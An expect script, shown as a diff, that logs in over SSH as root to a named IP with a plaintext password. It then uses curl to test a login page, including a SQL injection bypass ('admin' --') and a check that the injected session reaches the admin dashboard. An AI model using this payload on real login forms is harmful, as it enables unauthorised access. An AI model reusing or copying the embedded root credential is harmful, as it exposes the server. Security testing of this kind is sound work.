@@ -1,0 +1,51 @@
+#!/usr/bin/expect -f
+
+set timeout 30
+set password {$$R00tbeer02}
+
+spawn ssh root@155.138.197.128
+
+expect {
+    "password:" {
+        send "$password\r"
+    }
+    "yes/no" {
+        send "yes\r"
+        expect "password:"
+        send "$password\r"
+    }
+}
+
+expect "# "
+
+send "echo '=== Testing Main Login Page ==='\r"
+expect "# "
+
+# Test regular login through main login.php
+send "curl -s -L -c /tmp/main_cookies.txt -X POST http://localhost/login.php -d \"username=admin&password=admin123\" | grep -o 'Welcome.*admin\\|Dashboard\\|Account Information' | head -2\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '=== Testing SQL Injection on Main Login ==='\r"
+expect "# "
+
+# Test SQL injection on main login.php
+send "curl -s -L -c /tmp/inject_cookies.txt -X POST http://localhost/login.php -d \"username=admin' -- &password=x\" | grep -o 'Welcome.*admin\\|Dashboard\\|ADMIN' | head -2\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '=== Checking Dashboard Access ==='\r"
+expect "# "
+
+# Check dashboard shows user details
+send "curl -s -b /tmp/inject_cookies.txt http://localhost/dashboard.php | grep -o 'Walter Administrator\\|123 Admin Street' | head -2\r"
+expect "# "
+
+send "echo ''\r"
+send "echo 'Main login page test complete!'\r"
+expect "# "
+
+send "exit\r"
+expect eof
+
+puts "\nMain login page is working correctly!"
